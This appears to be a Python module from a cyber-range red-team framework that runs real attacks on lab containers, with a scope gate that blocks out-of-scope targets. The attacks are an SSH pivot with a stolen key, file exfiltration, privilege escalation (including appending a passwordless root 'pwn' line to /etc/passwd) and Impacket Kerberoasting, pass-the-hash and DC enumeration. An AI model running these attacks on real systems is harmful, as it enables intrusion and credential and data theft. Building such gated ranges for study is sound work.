"""N1 — REAL credential pivot + exfil over a real SSH session (retires the SIMULATED
oracle for the `cred_pivot` and `exfil` move classes).

The IR's ssh-key edge (`deploy@webserver` works_on `dbadmin@customer_db_*`) is now a
real effect: red, executing on its earned foothold (the pivot container), uses the
stolen private key to open a REAL key-authenticated SSH session to the db and run a
command. Each move is gate-mediated first, and state advances only on an out-of-band
observable — the confirm->mutate spine, now grounded in a real login:

  - cred_pivot: `ssh -i <stolen key> dbadmin@<db> hostname` — a real login. The db
    reports its OWN identity (hostname) back; that response is the independent
    observation (not red's word), so `confirm(..., simulated=False)` is honest. Then
    mutate "lateral".
  - exfil: over the same channel, `cat <loot path>` returns the real loot BYTES; the
    confirmation records that the bytes equal the planted crown secret. Then mutate
    "exfil". The scorer credits a flag only on BOTH a confirm and a mutate.

An out-of-scope target is blocked by the gate and no SSH ever runs. No Docker / failed
login -> no confirm -> no mutate (a claim cannot advance state). Nothing is faked: a
rejected key or an unreachable host yields a real `pivot_failed`, not a fake success.

Honest limit: the pivot user's account is a stub shell on a generic alpine+openssh
image — privesc and service-migration are still SIMULATED (next N1 flips).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from swarm.gate import run_effect, EffectTimeout  # noqa: E402  (one effect path)

from swarm import spine   # noqa: E402
from swarm import shellsafe   # noqa: E402  (A2: shlex.quote every agent value reaching a shell)

SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=5", "-o", "BatchMode=yes"]

# Where the foothold mounts the staged modern SSH client (swarm.range_runtime stages it from the
# range-node image at standup). The real DMZ foothold is a period-accurate image (Debian jessie)
# whose native crypto (libssh2 1.4.3 / OpenSSL 1.0.1) shares NO key-exchange with the modern
# target sshd (OpenSSH 10), so red uses a dropped self-contained client — exactly the "drop your
# own tools" tradecraft a real operator uses on a foothold that lacks a usable client.
SSH_STAGE = "/opt/sshstage"


def _staged_pw_cmd(user, dst_ip, remote_cmd, password, *, stage=SSH_STAGE):
    """Non-interactive PASSWORD SSH via the dropped modern client, bypassing the foothold's
    ancient crypto. The password reaches ssh through SSH_ASKPASS (an env var the askpass script
    echoes) under a detached session (setsid) — never on ssh's own argv. Models the realistic
    'equifax-hub' edge: a plaintext DB credential harvested on the DMZ host unlocks the DB host."""
    opts = ("-o StrictHostKeyChecking=no -o GlobalKnownHostsFile=/dev/null "
            "-o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password "
            "-o PubkeyAuthentication=no -o ConnectTimeout=10")
    return (f"env DBPW={shellsafe.arg(password)} SSH_ASKPASS={stage}/askpass SSH_ASKPASS_REQUIRE=force "
            f"DISPLAY=:0 setsid -w {stage}/ld-musl-x86_64.so.1 --library-path {stage} "
            f"{stage}/ssh {opts} {shellsafe.arg(user)}@{shellsafe.arg(dst_ip)} {shellsafe.arg(remote_cmd)}")


def _ssh(src_container, key_path, user, dst_ip, remote_cmd, timeout=12,
         *, password=None, ssh_client=None):
    """Run `remote_cmd` on dst_ip as `user` over a real SSH session launched FROM
    `src_container` (red's earned foothold). With `password`+`ssh_client` (a staged modern
    client dir on the foothold) it is a real PASSWORD login via the dropped client; otherwise a
    real key-authenticated login with the stolen key. (rc, out)."""
    if password is not None and ssh_client:
        cmd = _staged_pw_cmd(user, dst_ip, remote_cmd, password, stage=ssh_client)
    else:
        opts = " ".join(SSH_OPTS)
        cmd = (f"ssh -i {shellsafe.arg(key_path)} {opts} "
               f"{shellsafe.arg(user)}@{shellsafe.arg(dst_ip)} {shellsafe.arg(remote_cmd)}")
    try:
        r = run_effect(["docker", "exec", src_container, "sh", "-c", cmd],
                           capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout or "").strip() + (("\n" + r.stderr.strip()) if r.returncode else "")
    except EffectTimeout:
        return 124, "timeout"
    except FileNotFoundError:
        return 127, "docker not available"


def cred_pivot(log, gate, actor, src_host, src_container, key_path, user,
               dst_host, dst_ip, *, src_ip=None, password=None, ssh_client=None,
               provenance=None):
    """Gate-mediated REAL credential pivot src_host -> dst_host. Returns True iff a
    real SSH login succeeded and state advanced via a prior confirmation. With
    `password`+`ssh_client` the login is a real password auth via the dropped client."""
    from swarm.gate import OutOfScope

    def _do():
        rc, out = _ssh(src_container, key_path, user, dst_ip, "hostname",
                       password=password, ssh_client=ssh_client)
        observed_host = out.splitlines()[0].strip() if rc == 0 and out.strip() else ""
        if rc != 0 or not observed_host:
            log.append(actor, "pivot_failed",
                       {"dst": dst_host, "reason": f"ssh login failed rc={rc}", "detail": out[:200]})
            return False
        c = spine.confirm(log, "lateral", dst_host, observed_by="range", simulated=False,
                          method="real-ssh-login", observed_host=observed_host)
        spine.mutate(log, actor, "lateral", dst_host, via_confirm=c["seq"],
                     as_user=user, src=src_host)
        return True

    try:
        _meta = spine.coords(src_ip or src_host, dst_ip, 22, "T1021")
        if provenance:
            _meta["provenance_hash"] = provenance   # a DISTINCT cred is novelty, not a dead loop
        return gate.dispatch(actor, "cred_pivot", dst_host, _do, meta=_meta)
    except OutOfScope:
        return "blocked"


# Incalmo EscelatePrivledge, low-level forms: the remote attempt per discovered vuln.
# Each echoes the resulting uid as its LAST line; root == "0" is the only confirmation.
_PRIVESC_CMD = {
    "SudoBaron": "sudo -n id -u 2>/dev/null",
    "sudo_baron": "sudo -n id -u 2>/dev/null",
    "WriteablePasswd": ("sh -c \"echo 'pwn::0:0::/root:/bin/sh' >> /etc/passwd 2>/dev/null; "
                        "su -s /bin/sh pwn -c 'id -u' 2>/dev/null\""),
    "writeable_passwd": ("sh -c \"echo 'pwn::0:0::/root:/bin/sh' >> /etc/passwd 2>/dev/null; "
                         "su -s /bin/sh pwn -c 'id -u' 2>/dev/null\""),
}


def privesc(log, gate, actor, host, container, key_path, user, dst_ip,
            *, vuln, to_user="root", src_ip=None):
    """Gate-mediated REAL local privilege escalation on a foothold red holds (Incalmo
    `EscelatePrivledge`). Runs the vuln-specific attempt over the earned SSH channel, then
    reads `id -u` back out-of-band — state advances to root ONLY if the target reports
    uid 0 (its own word, not red's). A stub shell with no real privesc vuln reports a
    non-zero uid => a real `privesc_failed`, never a SIMULATED success. Returns True iff
    a confirmed elevation advanced state."""
    from swarm.gate import OutOfScope
    cmd = _PRIVESC_CMD.get(vuln, "id -u")

    def _do():
        rc, out = _ssh(container, key_path, user, dst_ip, cmd)
        uid = next((ln.strip() for ln in reversed((out or "").splitlines()) if ln.strip()), "")
        if rc != 0 or uid != "0":
            log.append(actor, "privesc_failed",
                       {"dst": host, "vuln": vuln, "reason": f"no root (uid={uid or '?'}) rc={rc}"})
            return False
        c = spine.confirm(log, "privesc", host, observed_by="range", simulated=False,
                          method=f"real-privesc:{vuln}", observed_uid=uid, to_user=to_user)
        spine.mutate(log, actor, "privesc", host, via_confirm=c["seq"],
                     to_user=to_user, vuln=vuln, from_user=user)
        return True

    try:
        return gate.dispatch(actor, "privesc", host, _do,
                             meta=spine.coords(src_ip or host, dst_ip, 22, "T1068", vuln=vuln))
    except OutOfScope:
        return "blocked"


def exfil(log, gate, actor, src_host, src_container, key_path, user,
          dst_host, dst_ip, loot_path, *, expected=None, grounder=None, src_ip=None,
          password=None, ssh_client=None):
    """Gate-mediated REAL exfil over the earned SSH channel. Returns the loot bytes on
    a confirmed read, 'blocked' if the gate denied, or None on a failed read.

    The confirm records a REAL byte check on what was read: `grounder(out)` when a content
    predicate is supplied (e.g. crown_data.looks_like_pii — the exfil grounds on the sensitive
    data genuinely being present, not an opaque label), else exact-match against `expected`."""
    from swarm.gate import OutOfScope

    def _do():
        rc, out = _ssh(src_container, key_path, user, dst_ip, f"cat {shellsafe.arg(loot_path)}",
                       password=password, ssh_client=ssh_client)
        if rc != 0 or not out:
            log.append(actor, "exfil_failed", {"dst": dst_host, "reason": f"read failed rc={rc}"})
            return None
        if grounder is not None:
            matches = bool(grounder(out))
        elif expected is not None:
            matches = (out == expected)
        else:
            matches = None
        c = spine.confirm(log, "exfil", dst_host, observed_by="range", simulated=False,
                          method="real-ssh-read", bytes_len=len(out), matches_expected=matches)
        spine.mutate(log, actor, "exfil", dst_host, via_confirm=c["seq"],
                     loot_path=loot_path, src=src_host)
        return out

    try:
        return gate.dispatch(actor, "exfiltrate", dst_host, _do,
                             meta=spine.coords(src_ip or src_host, dst_ip, 22, "T1041"))
    except OutOfScope:
        return "blocked"


# ── AD moves (Phase 2b) — first-class gate-mediated + spine-confirmed identity-tier tools ──
# Each runs a REAL off-the-shelf attack via the earned channel `exec_fn(cmd)->str` (channel-agnostic,
# like live_postex: in live, an Impacket command on a tooling/attacker container that reaches the DC;
# offline, an injected fake). State advances ONLY on the target/DC's OWN response (a $krb5tgs$ ticket,
# an authenticated session) — confirm(simulated=False) -> mutate. An out-of-scope / tier-line target
# is gate-blocked before any tool runs (the studied crossing); a failure yields a real *_failed, never
# a fake success. The hard floor still contains everything.
import re  # noqa: E402

_KRB5TGS_RE = re.compile(r"\$krb5tgs\$[^\s]+")


def kerberoast(log, gate, actor, exec_fn, dc_ip, domain, user, password, *,
               target_host="dc", src_ip=None):
    """Kerberoast (T1558.003): request a TGS for a roastable SPN via the earned channel (Impacket
    GetUserSPNs). Advances only on a returned $krb5tgs$ ticket (the DC's own response)."""
    from swarm.gate import OutOfScope

    def _do():
        out = exec_fn(f"GetUserSPNs.py {shellsafe.arg(domain)}/{shellsafe.arg(user)}:"
                      f"{shellsafe.arg(password)} -dc-ip {shellsafe.arg(dc_ip)} -request") or ""
        tickets = _KRB5TGS_RE.findall(out)
        if not tickets:
            log.append(actor, "kerberoast_failed", {"dst": target_host, "detail": out[:200]})
            return False
        c = spine.confirm(log, "credential_access", target_host, observed_by="range",
                          simulated=False, method="kerberoast", roastable_tickets=len(tickets))
        spine.mutate(log, actor, "credential_access", target_host, via_confirm=c["seq"],
                     technique="T1558.003", tickets=len(tickets))
        return True
    try:
        return gate.dispatch(actor, "kerberoast", target_host, _do,
                             meta=spine.coords(src_ip or "attacker", dc_ip, 88, "T1558.003"))
    except OutOfScope:
        return "blocked"


def pass_the_hash(log, gate, actor, exec_fn, dst_host, dst_ip, domain, user, nthash, *, src_ip=None):
    """Pass-the-hash (T1550.002): authenticate to dst over SMB with a stolen NT hash via the earned
    channel (Impacket). Advances only on a real authenticated session (the target's own response)."""
    from swarm.gate import OutOfScope

    def _do():
        # Impacket >=0.13 smbclient.py dropped the `-c <cmd>` flag; drive one command over stdin.
        # A successful NTLM-hash auth prints the "Type help for list of commands" session banner
        # (the ok signal below) before the command runs; a failed auth never reaches the banner.
        out = exec_fn(f"echo quit | smbclient.py -hashes :{shellsafe.arg(nthash)} "
                      f"{shellsafe.arg(domain)}/{shellsafe.arg(user)}@{shellsafe.arg(dst_ip)}") or ""
        low = out.lower()
        ok = ("type help" in low or "authenticated" in low) and \
             "status_logon_failure" not in low and "denied" not in low
        if not ok:
            log.append(actor, "pth_failed", {"dst": dst_host, "detail": out[:200]})
            return False
        c = spine.confirm(log, "lateral", dst_host, observed_by="range", simulated=False,
                          method="pass-the-hash", auth="ntlm-hash")
        spine.mutate(log, actor, "lateral", dst_host, via_confirm=c["seq"],
                     technique="T1550.002", as_user=user)
        return True
    try:
        return gate.dispatch(actor, "pass_the_hash", dst_host, _do,
                             meta=spine.coords(src_ip or "attacker", dst_ip, 445, "T1550.002"))
    except OutOfScope:
        return "blocked"


def dc_auth(log, gate, actor, exec_fn, dc_host, dc_ip, domain, user, *,
            nthash=None, password=None, src_ip=None):
    """DC authentication (the Tier-0 crossing): bind to the DC over LDAP/SMB via the earned channel.
    Advances only on a real authenticated query (the DC's own response)."""
    from swarm.gate import OutOfScope
    cred = f"-hashes :{shellsafe.arg(nthash)}" if nthash else ""
    auth = f":{shellsafe.arg(password)}" if password else ""

    def _do():
        out = exec_fn(f"GetADUsers.py {shellsafe.arg(domain)}/{shellsafe.arg(user)}{auth} {cred} "
                      f"-dc-ip {shellsafe.arg(dc_ip)} -all") or ""
        low = out.lower()
        if ("querying" not in low and "@" not in out) or "error" in low or "failure" in low:
            log.append(actor, "dc_auth_failed", {"dst": dc_host, "detail": out[:200]})
            return False
        c = spine.confirm(log, "dc_access", dc_host, observed_by="range", simulated=False,
                          method="dc-auth")
        spine.mutate(log, actor, "dc_access", dc_host, via_confirm=c["seq"], technique="T1078")
        return True
    try:
        return gate.dispatch(actor, "dc_auth", dc_host, _do,
                             meta=spine.coords(src_ip or "attacker", dc_ip, 389, "T1078"))
    except OutOfScope:
        return "blocked"


if __name__ == "__main__":  # self-check: gate + spine wiring, no Docker (fake ssh)
    from swarm.gate import Gate
    from swarm.eventlog import EventLog
    import tempfile

    # fake the real ssh: a successful login returns a hostname; cat returns the secret.
    def _fake(src, key, user, ip, remote, timeout=12, *, password=None, ssh_client=None):
        if remote == "hostname":
            return 0, "range-customer_db_0"
        if remote.startswith("cat "):
            return 0, "FLAG::customer_db_0::secret"
        if "id -u" in remote or "sudo" in remote or "su -s" in remote:
            # the db reports root (uid 0); the webserver stub reports an unprivileged uid.
            return (0, "0") if ip == "10.11.0.10" else (0, "1000")
        return 1, "no"
    _ssh = _fake   # rebind module global cred_pivot/exfil/privesc resolve at call time

    p = Path(tempfile.mktemp(suffix=".jsonl"))
    log = EventLog(p)
    gate = Gate([], log, scope_by_actor={"red": ["webserver", "customer_db_0"]})

    assert cred_pivot(log, gate, "red", "webserver", "range-webserver",
                      "/k", "dbadmin", "customer_db_0", "10.11.0.10") is True
    got = exfil(log, gate, "red", "webserver", "range-webserver", "/k", "dbadmin",
                "customer_db_0", "10.11.0.10", "/home/dbadmin/loot.json",
                expected="FLAG::customer_db_0::secret")
    assert got == "FLAG::customer_db_0::secret", got
    # out-of-scope target: blocked, no ssh, no confirm/mutate
    assert cred_pivot(log, gate, "red", "webserver", "range-webserver",
                      "/k", "dbadmin", "decoy", "10.99.0.10") == "blocked"
    # privesc (Incalmo EscelatePrivledge): the db reports uid 0 -> confirmed root,
    # state advances. The webserver stub reports a non-root uid -> real privesc_failed,
    # NO mutation (a claim can't advance state). An oos host is blocked (no ssh).
    assert privesc(log, gate, "red", "customer_db_0", "range-webserver", "/k",
                   "dbadmin", "10.11.0.10", vuln="SudoBaron") is True
    assert privesc(log, gate, "red", "webserver", "range-webserver", "/k",
                   "www-data", "10.10.0.2", vuln="WriteablePasswd") is False
    assert privesc(log, gate, "red", "decoy", "range-webserver", "/k",
                   "x", "10.99.0.10", vuln="SudoBaron") == "blocked"

    entries = [__import__("json").loads(x) for x in p.read_text().splitlines() if x.strip()]
    acts = [e["action"] for e in entries]
    assert acts == ["gate.allow", "confirm", "state.mutate",
                    "gate.allow", "confirm", "state.mutate", "gate.block",
                    "gate.allow", "confirm", "state.mutate",   # privesc confirmed root
                    "gate.allow", "privesc_failed",            # privesc no-root (honest fail)
                    "gate.block"], acts                        # privesc oos
    # the confirmed privesc rode a real out-of-band uid-0 observation, not a self-report
    pe = [e for e in entries if e["action"] == "confirm" and e["data"]["confirms"] == "privesc"]
    assert pe and pe[0]["data"]["fidelity"] == "real" and pe[0]["data"]["observed_uid"] == "0"
    # spine law holds: every mutation rides a prior range confirmation, none self-reported
    assert spine.audit_spine(entries) == [], spine.audit_spine(entries)
    # confirmations are REAL fidelity, observed by the range (not red)
    for e in entries:
        if e["action"] == "confirm":
            assert e["data"]["fidelity"] == "real" and e["actor"] == "range"
    p.unlink()

    # AD moves (Phase 2b): a faked earned Impacket channel. A $krb5tgs$ ticket / an SMB session /
    # a DC query is the target's OWN response -> confirm(simulated=False) -> mutate; a failed auth
    # advances nothing; a tier-line (out-of-red-scope) target is gate-blocked before any tool runs.
    import json as _json
    p2 = Path(tempfile.mktemp(suffix=".jsonl"))
    log2 = EventLog(p2)
    g2 = Gate([], log2, scope_by_actor={"red": ["app-fs", "db-core"]})   # dc-01 OUT (tier line)

    def _roast(cmd):
        return "svc_sql  MSSQLSvc/..  $krb5tgs$23$*svc_sql$RANGE.LAB*$abcdef0123" if "GetUserSPNs" in cmd else ""

    def _pth(cmd):
        return "Type help for list of commands" if "smbclient" in cmd else ""

    def _dcq(cmd):
        return "Querying RANGE.LAB for information\nAdministrator@range.lab" if "GetADUsers" in cmd else ""

    assert kerberoast(log2, g2, "red", _roast, "10.50.0.11", "RANGE.LAB", "analyst", "pw",
                      target_host="app-fs") is True
    assert pass_the_hash(log2, g2, "red", _pth, "db-core", "10.40.0.10", "RANGE.LAB", "svc_da",
                         "670f33eb8bdc60aa8b0542c478c90851") is True
    # a failed authentication advances NOTHING (no fake success)
    assert pass_the_hash(log2, g2, "red", lambda c: "STATUS_LOGON_FAILURE", "db-core",
                         "10.40.0.10", "RANGE.LAB", "x", "00") is False
    # the DC is OUT of red's gate scope (the tier line) -> the AD move is BLOCKED before any tool runs
    assert pass_the_hash(log2, g2, "red", _pth, "dc-01", "10.50.0.11", "RANGE.LAB", "svc_da",
                         "670f33eb8bdc60aa8b0542c478c90851") == "blocked"
    assert dc_auth(log2, g2, "red", _dcq, "dc-01", "10.50.0.11", "RANGE.LAB", "svc_da",
                   nthash="670f33eb8bdc60aa8b0542c478c90851") == "blocked"
    assert dc_auth(log2, g2, "red", _dcq, "app-fs", "10.30.0.10", "RANGE.LAB", "analyst",
                   password="pw") is True   # in-scope wiring test
    ad = [_json.loads(x) for x in p2.read_text().splitlines() if x.strip()]
    assert spine.audit_spine(ad) == [], spine.audit_spine(ad)   # every AD mutate rode a confirm
    kinds = {e["data"]["confirms"] for e in ad if e["action"] == "confirm"}
    assert {"credential_access", "lateral", "dc_access"} <= kinds, kinds
    # the tier-line crossings were recorded as gate blocks (not run, not faked)
    blocks = [e for e in ad if e["action"] == "gate.block"]
    assert len(blocks) >= 2, blocks
    p2.unlink()

    # Staged password-SSH transport (the dropped-client edge): the password reaches ssh via
    # SSH_ASKPASS (never on ssh's own argv), auth is forced to password, and the dropped client
    # under SSH_STAGE is what runs — so a period-accurate foothold with no usable native client
    # can still pivot. Shape-guarded here; exercised live by the unified data-theft run.
    pw_cmd = _staged_pw_cmd("dbadmin", "10.40.0.10", "cat /home/dbadmin/pii.json",
                            "S3cr3t-DB-Range!", stage="/opt/sshstage")
    assert "SSH_ASKPASS=/opt/sshstage/askpass" in pw_cmd and "SSH_ASKPASS_REQUIRE=force" in pw_cmd
    assert "/opt/sshstage/ssh " in pw_cmd and "/opt/sshstage/ld-musl-x86_64.so.1" in pw_cmd
    assert "PreferredAuthentications=password" in pw_cmd and "PubkeyAuthentication=no" in pw_cmd
    # the password is passed to the askpass env (DBPW), NOT as an ssh command-line argument
    assert "DBPW='S3cr3t-DB-Range!'" in pw_cmd
    assert "ssh 'S3cr3t-DB-Range!'" not in pw_cmd and "@10.40.0.10 'S3cr3t" not in pw_cmd

    print("live_pivot ok (gated real SSH pivot+exfil; AD moves kerberoast/pass_the_hash/dc_auth "
          "gate-mediated + spine-confirmed on the target's own response; tier-line targets blocked; "
          "failed auth advances nothing; audit_spine clean)")
